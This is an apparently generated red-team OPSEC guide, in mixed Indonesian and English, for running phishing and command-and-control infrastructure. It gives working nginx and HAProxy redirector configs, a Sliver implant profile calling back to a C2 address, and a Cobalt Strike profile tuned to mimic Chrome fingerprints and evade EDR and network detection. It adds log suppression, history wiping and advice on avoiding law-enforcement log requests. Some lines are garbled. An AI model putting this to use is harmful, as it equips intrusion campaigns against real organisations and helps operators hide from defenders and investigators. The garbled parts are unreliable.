# opsec-tradecraft — opsec

# Red Team OPSEC: Infrastruktur Terpisah, Domain Aging, Redirector Chain, Fingerprint Matching, Logging Minimal, Tradecraft Harian

## 1. Prinsip Pemisahan Infrastruktur

| Asset | Purpose | Mandatory attributes | Must not be used for |
|---|---|---|---|
| Phishing infra | Halaman credential harvest / payload staging | Domain kategorisasi "Business/Finance", TLS valid (Let's Encrypt / ZeroSSL), email SPF/DKIM/DMARC aligned | C2 callback, beaconing |
| C2 infra | Long-haul beacon | No public web UI, no mail record, separate self-signed or LE wildcard certificate | Phishing, redirect from mass clicks |
| Redirector | Front-end traffic (HTTPS to C2) | Clean VPS IP, aged domain, HAProxy/nginx stream | Storing payloads, hosting pages |
| Staging | Serve one-time payload | Unique subdomain per campaign, short TTL | Beacon callback |
| Admin/VPN | Operasi operator | WireGuard, IP allowlist, MFA | Menyentuh target langsung |

Single rule: **one IP/domain/certificate never touches two roles**. Leakage = one infra burned, one campaign dead.

## 2. Domain Aging & Kategorisasi

**Timeline minimum (lapangan):**

| Umur | Status | Kegunaan |
|---|---|---|
| 0–7 days | New, not yet categorized | Park only, do not send email |
| 7–30 hari | Submit kategorisasi (Bluecoat, Fortiguard, Symantec, Google Safe Browsing) | Landing page dummy |
| 30–90 hari | Reputasi netral terbentuk | Redirector, phishing ringan |
| >90 days | Ready for credentials | Full phishing |

**Cek kategorisasi:**
```bash
# Palo Alto / BrightCloud
curl -s "https://urlfiltering.paloaltonetworks.com/api/query?url=https://target.example" 
# Symantec SiteReview (manual via browser)
# Fortiguard
curl -s "https://www.fortiguard.com/iprep?input=1.2.3.4&version=8"
# VirusTotal domain via API v3
curl -s -H "x-apikey: $VT" "https://www.virustotal.com/api/v3/domains/target.example" | jq '.data.attributes.categories, .data.attributes.reputation'
```

**Why it fails:**
- Domain <30 days + email → many gateways (Mimecast, Proofpoint) hold or quarantine due to *age signal*.
- Sertifikat freshly-issued Let's Encrypt (<24 jam) sering dianggap "suspicious new cert" oleh Cisco Umbrella.
- Domain without MX + SPF but used to send email = instant spam score.

## 3. Redirector Chain

**Architecture:** target → aged domain (redirector front) → TLS termination (nginx 1.25 `stream` or HAProxy 2.9) → C2 backend (different IP, different ASN).

**nginx 1.25 L4 redirector with SNI routing:**
```nginx
# /etc/nginx/nginx.conf — stream block
stream {
    map $ssl_preread_server_name $backend {
        cdn.example-aged.com   10.10.10.10:443;   # phishing backend
        mail.example-aged.com  10.10.10.11:443;   # staging
        default                10.10.10.12:443;   # C2
    }
    server {
        listen 443;
        proxy_pass $backend;
        ssl_preread on;
        proxy_timeout 300s;
        proxy_connect_timeout 5s;
    }
}
```

**Chained 3-hop (target → CDN aged → VPS redirector → C2):**

| Hop | Komponen | Transport | Detectability |
|---|---|---|---|
| 1 | Cloudflare/CloudFront domain aged | HTTPS 443 | Rendah; TLS cert LE wildcard |
| 2 | HAProxy 2.9 redirector VPS | TLS passthrough | Medium; VPS IP on common ASN (Hetzner/Vultr) |
| 3 | C2 (Sliver 1.5 / Mythic 3.2 / Cobalt Strike 4.10) | mTLS or HTTPS | Low if profile matching (see §5) |

**HAProxy 2.9 (same effect, cleaner logs):**
```
frontend tls_in
  bind *:443
  mode tcp
  tcp-request inspect-delay 5s
  tcp-request content accept if { req_ssl_hello_type 1 }
  use_backend phish  if { req_ssl_sni -i cdn.example-aged.com }
  use_backend c2     if { req_ssl_sni -i mail.example-aged.com }
  default_backend c2
```

**Why it works:** SNI passthrough does not terminate TLS at the redirector → backend cert is not exposed to proxy logging middleboxes. **Why it fails:** redirector on the same ASN as C2 → once the redirector IP is known, pivot to C2 via netflow (shared ASN + temporal correlation).

## 4. Sinkronisasi User-Agent & JA3

**Problem:** C2 callback with UA `python-requests/2.31` or default Go JA3 is usually dropped by modern EDR/NDR (Darktrace, ExtraHop, Corelight). Headless C2 run on a standard host (Ubuntu 24.04) emits a unique TLS fingerprint.

**Target baseline that must be mimicked (Chrome 131 / Windows 11 24H2):**

| Field | Reference value |
|---|---|
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36` |
| JA3 hash | `cd08e31494f9531f560d64c695473da9` (Chrome 128+, cipher order BoringSSL) |
| JA3S | adjust to nginx 1.25 `ssl_protocols TLSv1.2 TLSv1.3`, Chrome-order cipher list |
| HTTP/2 SETTINGS | `INITIAL_WINDOW=65535`, `MAX_FRAME=16384`, `HEADER_TABLE=65536` (Chrome default) |
| Header order | `Host, Connection, sec-ch-ua, sec-ch-ua-mobile, sec-ch-ua-platform, Upgrade-Insecure-Requests, User-Agent, Accept, Sec-Fetch-*` |

**Profil Sliver 1.5 `mTLS` (fase development):**
```
sliver > profiles new --mtls 1.2.3.4:443 \
  --format shellcode \
  --skip-symbols \
  --max-errors 5 \
  --reconnect 60s \
  --poll-timeout 360s \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" \
  chrome131
```

**Cobalt Strike 4.10 malleable profile (potongan):**
```
http-get {
    set uri "/updates/check client/2.31.5.0";
    client {
        header "Host" "cdn.example-aged.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.9";
        header "sec-ch-ua" "\"Chromium\";v=\"131\",\"Not_A Brand\";v=\"24\"";
        parameter "v" "2.31.5.0";
        metadata { base64url; prepend "s="; print; }
    }
    server { header "Content-Type" "text/html"; output { prepend "<html>"; append "</html>"; print; } }
}
stage {
    set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
    set keystore "/etc/cs/c2.jks"; set password "…";
    set sleeptime "60000";   # 60s beacon
    set jitter "40";
}
```

**Local JA3 verification before deploy:**
```bash
# pakai tlsfingerprint / ja3 via tshark
tshark -r /tmp/c2_test.pcap -Y "tls.handshake.type==1" \
  -T fields -e ip.dst -e tcp.dstport -e tls.handshake.ja3 2>/dev/null
# output harus sama dengan baseline Chrome 131 yang kamu rekam sendiri
```

**Why it fails:**
- UA Chrome 131 but JA3 belongs to Go (`18a4d79ef8...`) → mismatch immediately alerts in NDR.
- Chrome 131 claimed but HTTP/2 SETTINGS Go → `X-Forwarded-For` header in frontend vhost proxy reveals origin.
- Beacon 60s + jitter 40% for >8 hours from one target IP = temporal anomaly in NetFlow.
- TLS certificate with `subjectAltName=*.example.com` (wildcard) but only hits 1 hostname → "pre-login SNI mismatch" heuristics.

## 5. Logging Minimal

**Principle:** at every hop, log only what internal forensics needs — nothing that can be pivoted to operator identity.

**nginx 1.25 — disable access log for specific vhost, let errors go to `/dev/null`:**
```nginx
server {
    listen 443 ssl http2;
    server_name cdn.example-aged.com;
    access_log off;
    error_log /dev/null crit;
    ssl_certificate     /etc/letsencrypt/live/cdn.example-aged.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.example-aged.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384";
    location / { proxy_pass https://10.10.10.12:443; proxy_ssl_server_name on; }
}
```

**Drop filter for scanner probes (iptables/nftables) — do not log, drop silently:**
```bash
nft add table inet redir
nft add chain inet redir input '{ type filter hook input priority 0; }'
nft add rule inet redir input tcp dport 443 ct state new \
  ip saddr @tor_exits drop
nft add rule inet redir input tcp dport 443 \
  tcp flags & (fin|syn|rst|psh|ack|urg) == 0x0 drop    # XMAS scan
nft add rule inet redir input tcp dport 443 \
  tcp flags & (syn|fin) == (syn|fin) drop             # SYN+FIN
nft add rule inet redir input tcp dport 443 \
  ip frag-off & 0x1fff != 0 drop                       # frag
```

**HAProxy redirector — `log global` but without `option httplog` in TCP frontend:**
```
global
  log /dev/log local0 notice
defaults
  log global
  option  dontlognull
  timeout client 30s
  timeout server 30s
frontend tls_in
  bind *:443
  mode tcp
  option tcplog         # hanya L4: src IP, dst IP, duration, bytes
  # JANGAN: option httplog / capture request header
```

**C2 (Sliver) — redam console history operator:**
```bash
export HISTCONTROL=ignorespace
unset HISTFILE
# jalankan sliver client di dalam tmux + script(1) di /dev/null
```

**Why it fails:**
- default nginx `access_log` → `$remote_addr $http_user_agent` outbound to operator's own external syslog = logs containing target IPs appear in infra that IR can request.
- Cobalt Strike debug logging in `/opt/cobaltstrike/logs/` persists >30 days and is often left behind in VPS snapshots.
- `capture request header` in HAProxy exposes beacon pattern to logs.
- Cloudflare default logs (if using CF) retain 72 hours and can be subject to law enforcement requests — avoid CF for C2, use VPS directly.

## 6. Tradecraft Harian Operator

| Activity | Operational rule | Concrete artifact |
|---|---|---|
| Clock synchronization | NTP mandatory; skew >5s = beacon timing anomaly | `chronyc tracking \| grep "System time"` |
| Infra rotation | Change redirector IP every 7 days or after 1 "honeytoken hit" event | Record last-rotation in ops log |
| Shell session | `TERM=xterm-256color`, `PS1` standardized per host | Do not leave `root@ip-#` in screenshots |
| File transfer | Use staged upload only; forbid `wget`/`curl` to Multh | Assets only via staging vhost |
| Team communication | Signal/Matrix E2E; forbid channels that mention target name | Encode target ID (`T-042`) in daily log |
| Burn protocol | If C2 callback is detected (EDR kill), wait 72 hours before re-deploying profile | Count "cool-down window" |
| Notes | Ops log on host not on laptop; weekly rotation; LUKS disk | GPG encrypt log before upload |
| Beacon hygiene | Sleeptime min 45s; jitter 30–50%; hindari jam 02:00–04:00 UTC (batch IR) | `set sleeptime 60000; set jitter 40;` |
| Host compromise log | Stored on VPS *separate* from C2 infra | One "journal" VPS only |
| Kill switch | Store DNS/hetzner API token in password manager; rotate per campaign | Ready to drop redirector <5 minutes |

**Redirector rotation command (Hetzner Cloud API 1.44):**
```bash
# snapshot dulu, lalu recreate
hcloud server create --name redir-$(date +%s) --type cx22 --image ubuntu-24.04 \
  --location hel1 --ssh-key ops-key
# tunggu 90s, jalankan ansible playbook: nginx L4 + nftables + cert LE
ansible-playbook -i /etc/ansible/redir_hosts rotasi_redir.yml -e "backend_ip=10.10.10.12"
```

## 7. Daily Checklist (print, stick on monitor)

- [ ] Sinkron NTP <1s (`chronyc tracking | grep "System time"`)
- [ ] Redirector aktif, SNI mapping benar (`openssl s_client -servername cdn.example-aged.com -connect 1.2.3.4:443 </dev/null 2>/dev/null | openssl x509 -noout -subject`)
- [ ] C2 beacon fingerprint == Chrome 131 baseline (validate JA3 via tshark)
- [ ] Backend UA == baseline UA; no `python-requests`, `curl/*`, `Go-http-client`
- [ ] `access_log off` on active phishing & redirector vhosts
- [ ] Admin/VPN IP still allowlisted in redirector firewall
- [ ] Phishing domain: cek VT reputation <3 deteksi, kategorisasi != "Suspicious/Phishing"
- [ ] Payload time zone (e.g. `timedatectl`) matches target geography
- [ ] Ops log terisi tiap sesi; nama target disandikan `T-NNN`
- [ ] No target credentials stored in plaintext on C2 VPS
- [ ] Kill switch (API token) rotated since the previous day
- [ ] Beacon cooldown pasca-burn ≥72 jam tercatat

## Operational Pitfalls That Make All of This Fail

1. **One IP for phishing + C2.** When the target IR sees one drive-by, they pull the C2 PCAP within the same hour; the redirector becomes a pivot to the C2 & operator IP.
2. **Aged domain but new LE cert.** Bluecoat categorization uses a domain snapshot; new cert (<24 hours) but 90-day domain = combination red flag. Fill the cert at least 72 hours before use.
3. **JA3 matched but HTTP/2 fingerprint differs.** Chrome 131 UA + Chrome JA3 but Go SETTINGS = detection. Test with `curl --http2` to your own server, compare with a genuine Chrome 131 capture.
4. **Redirector `proxy_ssl_server_name on` with self-signed backend cert.** Non-matching backend SNI → alert at the middlebox. Always use a valid LE cert on the C2 backend, not self-signed, use mTLS for authentication if needed.
5. **nginx Active log then sent via `remote_syslog` to the operator host.** IR sees the beacon pattern in the operator log = full OPSEC collapse. `access_log off` is mandatory at the first layer.
6. **20s beacon during target working hours.** Darktrace/Huntress cover small traffic anomalies using a statistical baseline; 20s + 10% jitter is the "2015 C2 botnet" pattern. 45–60s with 40% jitter is realistic.
7. **`stealth` enabled in Cobalt Strike 4.10 but the malleable profile is out of sync.** CS `stealth` + standard HTTP GET profile = traffic shape mismatch from what the profile sends; test out of the box.
8. **Same VPS provider for 3 hops.** Hetzner + Hetzner + Hetzner = trivial ASN correlation. At least one hop in a different ASN (e.g., DigitalOcean → Vultr → Hetzner).
9. **Redirector used after a honeytoken metric alert.** One click from an analyst IP (e.g., vendor honeypot) = infra burn. Always check hits from vendor IR ranges (`185.x`, `20.x` Microsoft) before scaling.
10. **Operator history `~/.bash_history` on the laptop is clean but `~/.sliver/logs/` still exists.** CS/Sliver client stores session logs in home; pack it into LUKS or switch to `--no-save` (Sliver 1.5: `sliver --no-save`).

---

## [reasoning trace]


